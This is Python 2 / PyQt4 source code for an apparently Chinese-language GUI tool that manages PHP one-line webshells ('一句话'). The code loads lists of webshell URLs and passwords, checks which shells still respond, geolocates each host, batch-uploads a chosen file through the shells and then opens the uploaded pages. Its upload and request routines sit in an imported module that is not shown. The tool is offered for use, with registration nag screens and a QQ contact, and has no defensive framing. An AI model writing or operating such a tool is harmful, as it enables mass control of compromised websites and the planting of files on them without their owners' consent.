#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

# Form implementation generated from reading ui file 'untitled.ui'
#
# Created: Wed Aug 21 01:12:51 2013
#      by: PyQt4 UI code generator 4.10.1
#
# WARNING! All changes made in this file will be lost!

from PyQt4 import QtCore, QtGui
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import tkFileDialog  #打开文件对话框
#共0条--OK0条--NO0条--等待测试0条
yu_1=0  #共多少数据
yu_2=0  #成功多少条
yu_3=0  #失败多少条

#'ascii' codec can't decode byte 0xe9 in position 0: ordinal not in range(128
#解决方法
import sys
default_encoding = 'utf-8'
if sys.getdefaultencoding() != default_encoding:
    reload(sys)
    sys.setdefaultencoding(default_encoding)

import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)
try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName(_fromUtf8("Dialog"))
        Dialog.resize(1197, 570)
        self.pushButton = QtGui.QPushButton(Dialog)
        self.pushButton.setGeometry(QtCore.QRect(10, 290, 131, 31))
        self.pushButton.setObjectName(_fromUtf8("pushButton"))
        self.pushButton_2 = QtGui.QPushButton(Dialog)
        self.pushButton_2.setGeometry(QtCore.QRect(150, 250, 131, 71))
        self.pushButton_2.setObjectName(_fromUtf8("pushButton_2"))
        self.pushButton_7 = QtGui.QPushButton(Dialog)
        self.pushButton_7.setGeometry(QtCore.QRect(10, 540, 271, 23))
        self.pushButton_7.setObjectName(_fromUtf8("pushButton_7"))
        self.textEdit_3 = QtGui.QTextEdit(Dialog)
        self.textEdit_3.setGeometry(QtCore.QRect(10, 10, 271, 231))
        self.textEdit_3.setObjectName(_fromUtf8("textEdit_3"))
        self.tableView = QtGui.QTableView(Dialog)
        self.tableView.setGeometry(QtCore.QRect(290, 10, 901, 551))
        self.tableView.setObjectName(_fromUtf8("tableView"))
        self.checkBox = QtGui.QCheckBox(Dialog)
        self.checkBox.setGeometry(QtCore.QRect(10, 250, 141, 16))
        self.checkBox.setObjectName(_fromUtf8("checkBox"))
        self.checkBox_2 = QtGui.QCheckBox(Dialog)
        self.checkBox_2.setGeometry(QtCore.QRect(10, 270, 141, 16))
        self.checkBox_2.setObjectName(_fromUtf8("checkBox_2"))
        self.checkBox_3 = QtGui.QCheckBox(Dialog)
        self.checkBox_3.setGeometry(QtCore.QRect(190, 350, 91, 20))
        self.checkBox_3.setObjectName(_fromUtf8("checkBox_3"))
        self.pushButton_3 = QtGui.QPushButton(Dialog)
        self.pushButton_3.setGeometry(QtCore.QRect(10, 420, 131, 31))
        self.pushButton_3.setObjectName(_fromUtf8("pushButton_3"))
        self.textEdit_2 = QtGui.QTextEdit(Dialog)
        self.textEdit_2.setGeometry(QtCore.QRect(10, 460, 271, 31))
        self.textEdit_2.setObjectName(_fromUtf8("textEdit_2"))
        self.pushButton_5 = QtGui.QPushButton(Dialog)
        self.pushButton_5.setGeometry(QtCore.QRect(150, 500, 131, 31))
        self.pushButton_5.setObjectName(_fromUtf8("pushButton_5"))
        self.textEdit = QtGui.QTextEdit(Dialog)
        self.textEdit.setGeometry(QtCore.QRect(10, 380, 271, 31))
        self.textEdit.setObjectName(_fromUtf8("textEdit"))
        self.label = QtGui.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(10, 350, 61, 16))
        self.label.setObjectName(_fromUtf8("label"))
        self.pushButton_4 = QtGui.QPushButton(Dialog)
        self.pushButton_4.setGeometry(QtCore.QRect(10, 500, 131, 31))
        self.pushButton_4.setObjectName(_fromUtf8("pushButton_4"))
        self.textEdit_4 = QtGui.QTextEdit(Dialog)
        self.textEdit_4.setGeometry(QtCore.QRect(70, 340, 71, 31))
        self.textEdit_4.setObjectName(_fromUtf8("textEdit_4"))
        self.pushButton_6 = QtGui.QPushButton(Dialog)
        self.pushButton_6.setGeometry(QtCore.QRect(150, 420, 131, 31))
        self.pushButton_6.setObjectName(_fromUtf8("pushButton_6"))
        self.label_2 = QtGui.QLabel(Dialog)
        self.label_2.setGeometry(QtCore.QRect(150, 350, 41, 20))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.label_3 = QtGui.QLabel(Dialog)
        self.label_3.setGeometry(QtCore.QRect(10, 320, 271, 20))
        self.label_3.setObjectName(_fromUtf8("label_3"))

        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)
        ###################################  信号和槽
        QtCore.QObject.connect(self.pushButton, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button) #导入一句话
        QtCore.QObject.connect(self.pushButton_2, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_2) #手动测试一句话
        QtCore.QObject.connect(self.checkBox, QtCore.SIGNAL(_fromUtf8("clicked()")), self.test_checkBox)  #复选框
        QtCore.QObject.connect(self.pushButton_3, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_3) #上传文件
        QtCore.QObject.connect(self.pushButton_6, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_6) #访问上传文件URL路径
        QtCore.QObject.connect(self.pushButton_4, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_4) #设置URL路径
        QtCore.QObject.connect(self.pushButton_5, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_5) #访问URL路径
        QtCore.QObject.connect(self.pushButton_7, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_7) #软件说明
        ###################################
        self.ini() #初始化
        self.ini_open() #读取INI配置信息
        ###################################
    def ini_open(self): #读取INI配置信息
        ini.ini_get()  #读取INI
        self.textEdit_4.setPlainText(ini.A1)
        self.textEdit.setPlainText(ini.A2)
        self.textEdit_2.setPlainText(ini.A3)

    def ini_send(self): #保存INI
        s1=self.textEdit_4.toPlainText() #获取内容
        s2=self.textEdit.toPlainText() #获取内容
        s3=self.textEdit_2.toPlainText() #获取内容
        ini.ini_write(s1,s2,s3)  #修改INI
    ###################################
    def test_checkBox(self):  #自动手动
        if self.checkBox.isChecked():
            self.pushButton_2.setEnabled(0)  #给改成禁用
        else:
            self.pushButton_2.setEnabled(1)

    def Button_7(self): #软件说明
        try:
            data=""
            xxx = file("sm.mdb", 'r')
            for xxx_line in xxx.readlines():
                data+=xxx_line
            user32.MessageBoxW(0,c_wchar_p(data), c_wchar_p("QQ:1043733492"), 0)   # 调用MessageBoxA函数
        except BaseException, e:
            print(str(e))
            pp=u"悟空你又调皮呢\n为师都告诉你别乱动师傅的东西.\n你怎么又乱动！！\n这事情我已经报告给了师傅 赶紧过来认错\n否则师傅要念紧箍咒了啊(你要倒霉了悟空)"
            user32.MessageBoxW(0,c_wchar_p(pp), c_wchar_p("QQ:1043733492"), 0)   # 调用MessageBoxA函数

    #初始化
    def ini(self): #初始化
        self.tableView_count(10)  #设置tableView属性  行数
        self.checkBox.setChecked( True )    #设置复选框为选择状态
        self.checkBox_2.setChecked( True )   #设置复选框为选择状态
        self.checkBox_3.setChecked( True )  #隐藏访问URL
        self.pushButton_2.setEnabled(0)  #给改成禁用

        self.messbx(time.strftime('%Y.%m.%d-%H.%M.%S'))
        self.messbx(u"版本号:0.1  --测试版本")
        self.messbx(u"目前只支持  PHP 一句话")
        self.messbx(u"QQ:1043733492定制--落雪设计")
        self.messbx(u"欢迎使用一句话利用工具")
        ###################################
    def messbx(self,data):
        self.textEdit_3.append(data)
    def tableView_count(self,h):  #设置tableView属性  行数
        self.model = QStandardItemModel()
        self.model.setColumnCount(6)     #列
        self.model.setRowCount(h+2)  #行  len(node)

        self.model.setHorizontalHeaderLabels([u'一句话地址',u'密码',u'状态',u'上传文件URL路径',u'访问URL路径',u'IP/地理位置'])
        self.tableView.setModel(self.model)

        #self.tableView.resizeColumnsToContents()   #由内容调整列
        self.tableView.setColumnWidth(0,200)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(1,50)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(2,35)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(3,200)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(4,200)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(5,200)  #设置表格的各列的宽度值
        for i in range(h+2):  #调整行高度  len(node)
            self.tableView.setRowHeight(i, 20)

        self.tableView.setEditTriggers(QTableWidget.NoEditTriggers)  #设置表格的单元为只读属性，即不能编辑
        self.tableView.setSelectionBehavior(QTableWidget.SelectRows) #点击选择是选择行//设置选中时为整行选中
        #self.tableView.setSelectionMode(QTableWidget.SingleSelection)  #禁止多行选择
        self.tableView.setAlternatingRowColors(True)  #还是只可以选择单行（单列）
        #self.tableView.verticalHeader().hide() #隐藏行头

    def retranslateUi(self, Dialog):
        Dialog.setWindowTitle(_translate("Dialog", "一句话--自动--上传网页文件--自动访问--我是晚辈  QQ:1043733492定制--落雪设计", None))
        self.pushButton.setText(_translate("Dialog", "导入一句话", None))
        self.pushButton_2.setText(_translate("Dialog", "手动选择\n"
                                                       "检测一句话\n"
                                                       "状态", None))
        self.pushButton_7.setText(_translate("Dialog", "软件说明", None))
        self.checkBox.setText(_translate("Dialog", "自动测试一句话状态", None))
        self.checkBox_2.setText(_translate("Dialog", "自动检测IP/地理位置", None))
        self.checkBox_3.setText(_translate("Dialog", "隐藏访问URL", None))
        self.pushButton_3.setText(_translate("Dialog", "上传文件", None))
        self.textEdit_2.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                                     "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                                     "p, li { white-space: pre-wrap; }\n"
                                                     "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                                     "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">123.php?del=123456</p></body></html>", None))
        self.pushButton_5.setText(_translate("Dialog", "访问URL路径", None))
        self.textEdit.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                                   "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                                   "p, li { white-space: pre-wrap; }\n"
                                                   "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                                   "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">123.php</p></body></html>", None))
        self.label.setText(_translate("Dialog", "延时/超时:", None))
        self.pushButton_4.setText(_translate("Dialog", "设置URL路径", None))
        self.textEdit_4.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                                     "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                                     "p, li { white-space: pre-wrap; }\n"
                                                     "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                                     "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">200</p></body></html>", None))
        self.pushButton_6.setText(_translate("Dialog", "访问上传文件URL路径", None))
        self.label_2.setText(_translate("Dialog", "/s(秒)", None))
        self.label_3.setText(_translate("Dialog", "==============================================", None))

    #添加数据
    def tableView_add(self,ints,s0,s1,s2,s3,s4,s5):  #添加数据
        try:
            if ints>=20:
                a=[u"大哥",u"伙计",u"哥们",u"大叔",u"财神爷",u"大地主"]
                b=[u"就花钱注册个吧！！",u"写个东西不容易啊真心的！",u"日子不好过啊注册下！！",u"注册下OK混口饭吃！！",u"码农不容易啊哎注册下！@@@",u"赞助俺下后面会有更多好东西！"]
                s1=random.randrange(0, 7)
                s2=random.randrange(0, 7)
                pp=u"未注册版本只允许添加20行数据\n%s\n%s\n 落雪设计提示"%(a[s1],b[s2])
                #print pp
                user32.MessageBoxW(0,c_wchar_p(pp), c_wchar_p("QQ:1043733492"), 0)   # 调用MessageBoxA函数
                return 0

            global yu_1,yu_2,yu_3
            if s3=="ok":
                s3=None
                #self.model.item(ints,3).setBackground(QColor(0, 0, 255))#//改变背景色
            if s3=="no":
                s3=None
                self.model.item(ints,3).setBackground(QColor(255, 0, 0))#//改变背景色
            if s4=="ok":
                s4=None
                #self.model.item(ints,3).setBackground(QColor(0, 0, 255))#//改变背景色
            if s4=="no":
                s4=None
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色

            if not s0==None:
                self.model.setItem(ints, 0, QStandardItem(s0))
            if not s1==None:
                self.model.setItem(ints, 1, QStandardItem(s1))
            if not s2==None:
                self.model.setItem(ints, 2, QStandardItem(s2))
            if not s3==None:
                self.model.setItem(ints, 3, QStandardItem(s3))
            if not s4==None:
                self.model.setItem(ints, 4, QStandardItem(s4))
            if not s5==None:
                self.model.setItem(ints, 5, QStandardItem(s5))

            if s2=="no":  #红色  #改变背景色
                self.model.item(ints,0).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,1).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,2).setBackground(QColor(255, 0, 0))#//改变背景色

            if s2=="ok":  #绿色
                self.model.item(ints,0).setForeground(QBrush(QColor(0, 0, 0)))  #//设置字符颜色
                self.model.item(ints,1).setForeground(QBrush(QColor(0, 0, 0)))  #//设置字符颜色
                self.model.item(ints,2).setForeground(QBrush(QColor(0, 0, 0)))  #//设置字符颜色

            if s2=="null":
                self.model.setItem(ints, 0, QStandardItem(""))
                self.model.setItem(ints, 1, QStandardItem(""))
                self.model.setItem(ints, 2, QStandardItem(s2))
                self.model.setItem(ints, 3, QStandardItem(""))
                self.model.setItem(ints, 4, QStandardItem(""))
                self.model.setItem(ints, 5, QStandardItem(""))
                self.model.item(ints,0).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,1).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,2).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,3).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,5).setBackground(QColor(255, 0, 0))#//改变背景色

            if s3==u"上传文件失败":
                self.model.item(ints,3).setBackground(QColor(255, 0, 0))#//改变背景色

            data4=u"<html><head/><body><p align="+u"center"+u">共%d条--OK%d条--NO%d条--等待测试%d条</p></body></html>"%(yu_1+2,yu_2,yu_3,yu_1+2-(yu_2+yu_3))
            self.label_3.setText(data4)
            #user32.MessageBoxW(0,c_wchar_p(yu_int), c_wchar_p("QQ:1043733492"), 0)   # 调用MessageBoxA函数
        except BaseException, e:
            print(str(e))
#        self.model.setSortRole(0) #排序
#        self.model.sort(3,Qt.AscendingOrder) #排序  排序只针对INT型

        self.tableView.setModel(self.model)

    #########################################################################################
    #导入一句话
    def Button(self):
        global yu_1
        self.ini_send() #保存INI
        self.sss=os.getcwd()
        self.fname = tkFileDialog.askopenfilename(initialdir =self.sss)
        self.tableView_count(len(open(self.fname).readlines()))  #设置tableView属性  行数#最直接的方法   计算行数
        xxx = file(self.fname, 'r')
        i=0
        for xxx_line in xxx.readlines():
            try:
                data=xxx_line
                if len(data)>=3:
                    s0,s1=yijuhua.open_file(data)
                    self.tableView_add(i,str(s0.rstrip('\n')),str(s1.strip().lstrip().rstrip('\n')),None,None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
            i+=1

        self.messbx(u"已经导入 %d 条 一句话"%(i))
        yu_1=i  #共多少数据

        if self.checkBox_2.isChecked():  #检测IP/地理位置
            thread.start_new_thread(self.T_hostip_WLWZ,()) #用线程获取    IP/地址位置
            self.messbx(u"=========================")
            self.messbx(u"开始==自动检测web IP/地址位置")

        if self.checkBox.isChecked():  #自动测试一句话
            thread.start_new_thread(self.yjh_cs,())  #测试一句话是否连接成功
            self.messbx(u"=========================")
            self.messbx(u"开始==自动测试一句话状态")
            self.messbx(u"一句话测试数据会保存在程序目录下")
            self.messbx(u"成功的则保存在OK.TXT")
            self.messbx(u"不成功的则保存在ON.TXT")


    def yjh_cs(self):  #测试一句话是否连接成功
        global yu_2,yu_3
        int_View=self.tableView.model().rowCount()   #获取共多少行
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in range(int_View):
            try:
                s0= model.data(model.index(index,0)).toString()
                s1= model.data(model.index(index,1)).toString()
                if s0=="":
                    yu_3+=1  #失败多少条
                    self.tableView_add(index,None,None,"null",None,None,None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    yu_3+=1  #失败多少条
                    self.tableView_add(index,None,None,"null",None,None,None)  #添加数据
                    continue  #跳过
                qs = QtCore.QString(s0)
                qs1 = QtCore.QString(s1)
                if yijuhua.yi_cs_php(str(qs),str(qs1)):
                #if yijuhua.yi_cs_php(str(s0),str(s1)):
                    yu_2+=1  #成功多少条
                    self.tableView_add(index,None,None,"ok",None,None,None)  #添加数据
                else:
                    yu_3+=1  #失败多少条
                    self.tableView_add(index,None,None,"no",None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
            time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"测试一句话 完成")

    #用线程获取    IP/地址位置
    def T_hostip_WLWZ(self):
        int_View=self.tableView.model().rowCount()   #获取共多少行
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in range(int_View):
            try:
                s0= model.data(model.index(index,0)).toString()
                if s0=="":
                    continue  #跳过
                if len(s0)<=7:
                    continue  #跳过
                data=yijuhua.www_wlwz(str(s0))
                self.tableView_add(index,None,None,None,None,None,data)  #添加数据
            except BaseException, e:
                print(str(e))
            time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"IP/地址位置 测试完成")

    #########################################################################################
    def Button_2(self): #手动测试一句话
        self.ini_send() #保存INI
        int_model = self.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.messbx(u"=========================")
            self.messbx(u"提示:请选择要测的一句话")
            return 0
        if self.checkBox.isChecked():  #自动测试一句话
            self.messbx(u"=========================")
            self.messbx(u"已经选择了====自动测试一句话状态了")
            self.messbx(u"别浪费网络资源了")
        else:
            thread.start_new_thread(self.yjh_cs_2,())  #测试一句话是否连接成功
            self.messbx(u"=========================")
            self.messbx(u"开始==手动测试一句话状态")
            self.messbx(u"一句话测试数据会保存在程序目录下")
            self.messbx(u"成功的则保存在OK.TXT")
            self.messbx(u"不成功的则保存在ON.TXT")
            self.messbx(u"%d条一句话开始测试"%int_id)

    def yjh_cs_2(self):  #测试一句话是否连接成功
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                if s0=="":
                    self.tableView_add(index,None,None,"null",None,None,None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(index,None,None,"null",None,None,None)  #添加数据
                    continue  #跳过
                if yijuhua.yi_cs_php(str(s0),str(s1)):
                    self.tableView_add(int_index,None,None,"ok",None,None,None)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,"no",None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"手动测试一句话 完成")
    #########################################################################################
    def Button_3(self):  #上传文件
        self.ini_send() #保存INI
        int_model = self.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.messbx(u"=========================")
            self.messbx(u"提示:请选择要上传的URL")
            return 0

        file_data=self.textEdit.toPlainText() #获取文件名
        if len(file_data)<=4:
            self.messbx(u"=========================")
            self.messbx(u"请输入上传文件名")
            return 0

        data=""
        try:
            xxx = file(file_data, 'r')
            for xxx_line in xxx.readlines():
                data+=xxx_line+"\r\n"
        except BaseException, e:
            print(str(e))
        if len(data)<=7:
            self.messbx(u"=========================")
            self.messbx(u"%s==文件数据是无效数据"%file_data)
            return 0
        abc=yijuhua.base64_jm(str(file_data),data)
        #多线程参数  abc   传入进去
        thread.start_new_thread(self.yjh_sc_php,(abc,file_data,))  #
        self.messbx(u"=========================")
        self.messbx(u"开始批量上传文件")
        self.messbx(u"%d==个地址需要上传"%int_id)
#        if yijuhua.url_post("http://127.0.0.1:8888/1.php","long",abc):  #提交数据
#            MessageBox(None, u'111111', u'提示', 0)
#        else:
#            MessageBox(None, u'22222', u'提示', 0)

    def yjh_sc_php(self,data,name):  #通过一句话上传PHP
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                if s0=="":
                    continue  #跳过
                if len(s0)<=7:
                    continue  #跳过
                if yijuhua.url_post(str(s0),str(s1),data):
                    TX=str(s0).rfind("/") #从尾部查找
                    url=str(s0)[0:TX+1]+name
                    self.tableView_add(int_index,None,None,None,url,None,None)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,None,u"上传文件失败",None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"通过一句话上传PHP 完成")
    #########################################################################################
    def Button_6(self): #访问上传文件URL路径
        self.ini_send() #保存INI
        int_model = self.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.messbx(u"=========================")
            self.messbx(u"提示:请选择要访问的URL")
            return 0

        url_time=self.textEdit_4.toPlainText() #获取  延迟
        if int(url_time)<=5:
            self.messbx(u"=========================")
            self.messbx(u"请重新设置访问延迟")
            return 0

        if self.checkBox_3.isChecked():  #隐藏访问
            thread.start_new_thread(self.YC_php_fz,(int(url_time),))  #隐藏 访问
        else:
            thread.start_new_thread(self.zc_fw_url,(int(url_time),))  #正常访问URL
        self.messbx(u"=========================")
        self.messbx(u"开始批量访问URL")
        self.messbx(u"%d==个地址需要访问"%int_id)

    def YC_php_fz(self,tl): #隐藏 访问
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s3= model.data(model.index(int_index,3)).toString()
                if s3=="":
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过
                if len(s3)<=7:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                if ~str(s3).find(":")>1:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                if yijuhua.open_url(str(s3),tl):    #延时访问
                    self.tableView_add(int_index,None,None,None,"ok",None,None)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"访问上传文件URL路径 完成")

    def zc_fw_url(self,tl): #正常访问URL
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s3= model.data(model.index(int_index,3)).toString()
                if s3=="":
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过
                if len(s3)<=7:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                if ~str(s3).find(":")>1:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                self.show_url(str(s3)) #正常打开RUL
                time.sleep(tl)
            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"访问上传文件URL路径 完成")
    #########################################################################################
    def Button_4(self): #设置URL路径
        self.ini_send() #保存INI
        int_model = self.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.messbx(u"=========================")
            self.messbx(u"提示:请选择要访问的URL")
            return 0

        url_time=self.textEdit_2.toPlainText() #获取  延迟
        if len(url_time)<=3:
            self.messbx(u"=========================")
            self.messbx(u"请重新设置要访问的地址")
            return 0
        thread.start_new_thread(self.sz_url,(str(url_time),))

    def sz_url(self,name):
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                if s0=="":
                    continue  #跳过
                if len(s0)<=7:
                    continue  #跳过

                TX=str(s0).rfind("/") #从尾部查找
                url=str(s0)[0:TX+1]+name
                self.tableView_add(int_index,None,None,None,None,url,None)  #添加数据

            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"访问上传文件URL路径 完成")
    #########################################################################################
    def show_url(self,url): #正常打开RUL
        try:
            webbrowser.open_new_tab(url)
            return 1
        except BaseException, e:
            print(str(e))
            return 0
    #########################################################################################
    def Button_5(self): #访问URL路径
        self.ini_send() #保存INI
        int_model = self.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.messbx(u"=========================")
            self.messbx(u"提示:请选择要访问的URL")
            return 0

        url_time=self.textEdit_4.toPlainText() #获取  延迟
        if int(url_time)<=5:
            self.messbx(u"=========================")
            self.messbx(u"请重新设置访问延迟")
            return 0

        if self.checkBox_3.isChecked():  #隐藏访问
            thread.start_new_thread(self.YC_php_fz2,(int(url_time),))  #
        else:
            thread.start_new_thread(self.zc_fw_url2,(int(url_time),))  #正常访问URL
        self.messbx(u"=========================")
        self.messbx(u"开始批量访问URL")
        self.messbx(u"%d==个地址需要访问"%int_id)

    def YC_php_fz2(self,tl):
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s4= model.data(model.index(int_index,4)).toString()
                if s4=="":
                    self.tableView_add(int_index,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过
                if len(s4)<=7:
                    self.tableView_add(int_index,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过

                if ~str(3).find(":")>1:
                    self.tableView_add(int_index,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过

                if yijuhua.open_url(str(s4),tl):    #延时访问
                    self.tableView_add(int_index,None,None,None,None,"ok",None)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,None,None,"no",None)  #添加数据
            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"访问URL路径 完成")

    def zc_fw_url2(self,tl): #正常访问URL
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s4= model.data(model.index(int_index,4)).toString()
                if s4=="":
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过
                if len(s4)<=7:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                if ~str(s4).find(":")>1:
                    self.tableView_add(int_index,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                self.show_url(str(s4)) #正常打开RUL
                time.sleep(tl)
            except BaseException, e:
                print(str(e))
                time.sleep(1)
        self.messbx(u"=========================")
        self.messbx(u"访问上传文件URL路径 完成")
    #########################################################################################
    #########################################################################################
    #########################################################################################
    #########################################################################################
    #########################################################################################
    #################################################
import unicodedata  #转换编码格式
import random #随机数
import ini #INI操作
import webbrowser
import time
import yijuhua #一句话处理
import thread
#import ctypes   #messagebox      MessageBox(None, str(hs), u'提示', 0)
#MessageBox = ctypes.windll.user32.MessageBoxA
from ctypes import *
user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库

import sys
import os
class Start(QtGui.QMainWindow):
    def __init__(self,parent=None):
        QtGui.QWidget.__init__(self,parent)
        self.ui=Ui_Dialog()#这儿跟上面那个class一样
#http://www.cnblogs.com/caomingongli/archive/2011/09/19/2181842.html    这个不错   PyQt之自定义无边框窗口遮盖任务栏显示问题
        flags = 0  #设置禁止最大化
        flags|= Qt.WindowMinimizeButtonHint  #设置禁止最大化
        self.setWindowFlags(flags)  #设置禁止最大化

        self.ui.setupUi(self)
        #self.ui.ini_Dialog()

if __name__=="__main__":
    app=QtGui.QApplication(sys.argv)
    myapp=Start()
    myapp.show()
    sys.exit(app.exec_())


